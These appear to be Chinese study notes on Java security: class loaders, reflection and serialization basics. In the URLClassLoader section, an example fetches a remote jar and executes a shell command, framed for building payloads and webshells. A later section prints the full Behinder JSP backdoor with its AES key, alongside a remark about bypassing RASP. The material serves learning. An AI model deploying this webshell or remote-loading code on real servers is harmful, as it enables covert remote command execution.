# Java安全

> https://www.javasec.org/
>
> b站：零溢出

## Java基础

### ClassLoader

Java是一个依赖于`JVM`（Java虚拟机）实现的跨平台的开发语言。Java程序在运行前需要先编译成`class`文件，Java类初始化的时候会调用`java.lang.ClassLoader`加载类字节码，`ClassLoader`会调用JVM的native方法（`defineClass0/1/2`）来定义一个`java.lang.Class`实例。

一切的Java类都必须经过JVM加载后才能运行，而`ClassLoader`的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是`Bootstrap ClassLoader`、`Extension ClassLoader`、`App ClassLoader`。

`AppClassLoader`是默认的类加载器，`ClassLoader.getSystemClassLoader()`返回的系统类加载器也是`AppClassLoader`。

尝试获取被`Bootstrap ClassLoader`类加载器所加载的类的`ClassLoader`时候都会返回`null`。如:`java.io.File.class.getClassLoader()`将返回一个`null`对象，因为`java.io.File`类在JVM初始化的时候会被`Bootstrap ClassLoader`加载。

`ClassLoader`类有如下核心方法：

1. `loadClass`（加载指定的Java类）
2. `findClass`（查找指定的Java类）
3. `findLoadedClass`（查找JVM已经加载过的类）
4. `defineClass`（定义一个Java类）
5. `resolveClass`（链接指定的Java类）

#### Java类动态加载方式

Java类加载方式分为**显式**和**隐式**，显式即我们通常使用 Java反射 或者 ClassLoader 来动态加载一个类对象，而隐式指的是 类名.方法名() 或 new 类实例。

显式类加载方式也可以理解为类动态加载，可以自定义类加载器去加载任意的类。

**常用的类动态加载方式：**

```java
// 反射加载TestHelloWorld示例
Class.forName("com.auspiow.classloader.TestHelloWorld");

// ClassLoader加载TestHelloWorld示例
this.getClass().getClassLoader().loadClass("com.auspiow.classloader.TestHelloWorld");
```

`Class.forName()`默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用`Class.forName("name", false, classLoader)`，而`ClassLoader.loadClass`默认不会初始化类方法。

### 自定义ClassLoader

`java.lang.ClassLoader`是所有的类加载器的父类，`java.lang.ClassLoader`有非常多的子类加载器，比如我们用于加载jar包的`java.net.URLClassLoader`其本身通过继承`java.lang.ClassLoader`类，重写了`findClass`方法从而实现了加载目录class文件甚至是远程资源文件。

如果`com.anbai.sec.classloader.TestHelloWorld`类存在的情况下，我们可以使用如下代码即可实现调用`hello`方法并输出：

```java
TestHelloWorld t = new TestHelloWorld();
String str = t.hello();
System.out.println(str);
```

我们可以使用自定义类加载器重写`findClass`方法，然后在调用`defineClass`方法的时候传入`TestHelloWorld`类的字节码的方式来向JVM中定义一个`TestHelloWorld`类，最后通过反射机制就可以调用`TestHelloWorld`类的`hello`方法了。

**TestClassLoader示例代码：**

```java
package com.auspiow.classloader;
import java.lang.reflect.Method;
public class TestClassLoader extends ClassLoader {
    private static String testClassName = "com.auspiow.classloader.TestHelloWorld";
    // TestHelloWorld类字节码
    private static byte[] testClassBytes = new byte[]{...};

    @Override
    public Class<?> findClass(String name) throws ClassNotFoundException {
        if (name.equals(testClassName)) {
            // 调用JVM的native方法定义TestHelloWorld类
            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
        }
        return super.findClass(name);
    }

    public static void main(String[] args) {
        TestClassLoader loader = new TestClassLoader();
        try {
            Class testClass = loader.loadClass(testClassName);
            Object testInstance = testClass.newInstance();
            Method method = testInstance.getClass().getMethod("hello");
            String str = (String) method.invoke(testInstance);
            System.out.println(str);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码的native方法绕过RASP检测，也可以用于加密重要的Java类字节码（只能算弱加密了）。

#### URLClassLoader

`URLClassLoader`继承了`ClassLoader`，`URLClassLoader`提供了加载远程资源的能力，在写漏洞利用的`payload`或者`webshell`的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。

**TestURLClassLoader.java示例：**

```java
package com.auspiow.classloader;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;

public class TestURLClassLoader {
    public static void main(String[] args) {
        try {
            URL url = new URL("https://auspiow/tools/cmd.jar");
            URLClassLoader ucl = new URLClassLoader(new URL[]{url});
            String cmd = "ls";

            // 通过URLClassLoader加载远程jar包中的CMD类
            Class cmdClass = ucl.loadClass("CMD");

            // 调用CMD类中的exec方法
            Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);

            // 获取命令执行结果的输入流
            InputStream           in   = process.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[]                b    = new byte[1024];
            int                   a    = -1;

            // 读取命令执行结果
            while ((a = in.read(b)) != -1) {
                baos.write(b, 0, a);
            }
            System.out.println(baos.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

远程的`cmd.jar`中就一个`CMD.class`文件，对应的编译之前的代码片段如下：

```java
import java.io.IOException;

public class CMD {
    public static Process exec(String cmd) throws IOException {
        return Runtime.getRuntime().exec(cmd);
    }
}
```

### 跨类加载器加载

RASP和IAST经常会用到跨类加载器加载类的情况，因为RASP/IAST会在任意可能存在安全风险的类中插入检测代码，因此必须得保证RASP/IAST的类能够被插入的类所使用的类加载正确加载，否则就会出现ClassNotFoundException，除此之外，跨类加载器调用类方法时需要特别注意一个基本原则：`ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射`。

**示例 - 跨类加载器加载：**

```java
package com.anbai.sec.classloader;

import java.lang.reflect.Method;

import static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_BYTES;
import static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_NAME;

public class TestCrossClassLoader {

    public static class ClassLoaderA extends ClassLoader {

        public ClassLoaderA(ClassLoader parent) {
            super(parent);
        }

        {
            // 加载类字节码
            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
        }

    }

    public static class ClassLoaderB extends ClassLoader {

        public ClassLoaderB(ClassLoader parent) {
            super(parent);
        }

        {
            // 加载类字节码
            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
        }

    }

    public static void main(String[] args) throws Exception {
        // 父类加载器
        ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();

        // A类加载器
        ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);

        // B类加载器
        ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);

        // 使用A/B类加载器加载同一个类
        Class<?> aClass  = Class.forName(TEST_CLASS_NAME, true, aClassLoader);
        Class<?> aaClass = Class.forName(TEST_CLASS_NAME, true, aClassLoader);
        Class<?> bClass  = Class.forName(TEST_CLASS_NAME, true, bClassLoader);

        // 比较A类加载和B类加载器加载的类是否相等
        System.out.println("aClass == aaClass：" + (aClass == aaClass));
        System.out.println("aClass == bClass：" + (aClass == bClass));

        System.out.println("\n" + aClass.getName() + "方法清单：");

        // 获取该类所有方法
        Method[] methods = aClass.getDeclaredMethods();

        for (Method method : methods) {
            System.out.println(method);
        }

        // 创建类实例
        Object instanceA = aClass.newInstance();

        // 获取hello方法
        Method helloMethod = aClass.getMethod("hello");

        // 调用hello方法
        String result = (String) helloMethod.invoke(instanceA);

        System.out.println("\n反射调用：" + TEST_CLASS_NAME + "类" + helloMethod.getName() + "方法，返回结果：" + result);
    }

}
```

程序执行后输出如下结果：

```java
aClass == aaClass：true
        aClass == bClass：false

        com.anbai.sec.classloader.TestHelloWorld方法清单：
public java.lang.String com.anbai.sec.classloader.TestHelloWorld.hello()

        反射调用：com.anbai.sec.classloader.TestHelloWorld类hello方法，返回结果：Hello World~
```

## JSP自定义类加载后门

以冰蝎为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的`equals`方法实现恶意攻击，其中`equals`方法传入的`pageContext`对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。

**冰蝎JSP后门：**

```jsp
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
    class U extends ClassLoader {

        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%>
<%
    if (request.getMethod().equals("POST")) {
        String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        session.putValue("u", k);
        Cipher c = Cipher.getInstance("AES");
        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
%>
```



### 反射

Java反射机制的核心是在程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性的方法。

如果不知道类或对象的具体信息，自然也就没有办法在编码阶段使用new来创建对象和使用对象。这个时候就可以使用反射使用类。

比如在spring中就有使用反射来动态构造类和属性的使用，以下代码是 XML 配置文件，用于依赖注入：

```xml
<beans>
    <bean id="person1" class="com.test.Person">
        <property name="name" value="小明"></property>
        <property name="age" value="20"></property>
        <property name="car" ref="car1"></property>
    </bean>
    <bean id="car1" class="com.test.Car">
        <property name="brand" value="BMW"></property>
        <property name="price" value="350000"></property>
    </bean>
</beans>
```

#### 反射的应用场景

在编译时根本无法知道该对象可能属于哪些类，程序只靠运行时信息来发现该对象和类的真实信息

log4j，Servlet，SSM框架技术都用到了反射机制

#### 反射操作

首先假设已经定义了这样一个java类

```java
public class Dog {
    private String name;
    public int a;
    Dog(){}
    Dog(String name){
        this.name = name;
    }
    void say(){
        System.out.println(name+"：嗷嗷叫");
    }
    void say(String message){
        System.out.println(name+"："+message);
    }

    @Override
    public String toString() {
        return "Dog{name=" + name + "}";
    }
}
```

1. 获取类（相关类：Class.forName）

   ```java
   Class c = Class.forName("Dog");
   ```

2. 根据类创建对象

   a.调用无参构造方法实例化对象

   ```java
   Object o = c.newInstance(); // java9之后被弃用了
   System.out.println(o) // Dog{name='null'}
   ```

   b.调用有参构造方法创建对象

   ```java
   Constructor cs = c.getConstructor(String.class);
   Constructor cs = c.getDeclaredConstructor(String.class);
   Object o = cs.newInstance("旺财");
   System.out.println(o); // Dog{name='旺财'}
   ```

3. 为对象属性赋值

   ```java
   for (Field f : c.getDeclaredFields()) {
       System.out.println(f);
   }
   ```

   能够输出所有的属性

   ```cmd
   private java.lang.String Dog.name
   public int Dog.a
   ```

   修改对象的名字

   ```java
   Field f = c.getDeclaredField("name");
   f.setAccessible(true);
   f.set(o,"大黄");
   ```

4. 调用对象方法

   a.重载情况

   ```java
   Method m = c.getDeclaredMethod("say",String.class);
   m.setAccessible(true);
   m.invoke(o,"汪汪汪");
   ```

   ```
   大黄:汪汪汪
   ```

### 反序列化

#### 序列化和反序列化

Java序列化是指把Java对象转换为字节序列的过程便于保存在内存、文件、数据库中。

反序列化就是把字节序列恢复为Java对象的过程。

#### 序列化的应用场景

将对象永久化保存到硬盘/数据库。序列化机制并不是Java语言才有的。Java对象的数据都是存放在内存中的，但是进程关闭或者设备关机会导致数据消失。有些场景比如用户的Session需要持久储存，需要一种机制将对象从内存保存到磁盘，并能够恢复到内存。这个过程就是序列化和反序列化。

需要将一台主机中的对象通过网络传输给另一台机器。如RPC，RMI，网络传输等场景。

#### 相关协议

对象的反序列化技术实现并不唯一。常见的反序列化协议：

* XML&SOAP
* JSON
* Protobuf
* Java Serializable 接口

#### 序列化相关操作

##### 将对象序列化成数据

只有实现了 Serializable 接口的类的对象才能被序列化为字节序列。Serializable 接口是Java提供的序列化接口。Serializable 用来书别当前类是否可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。

```java
import java.io.Serializable;
public class Dog implements Serializable {
    ...
}
```

可以调用 `ObjectOutputStream` 的 `writeObject` 方法序列化一个类并写入硬盘。

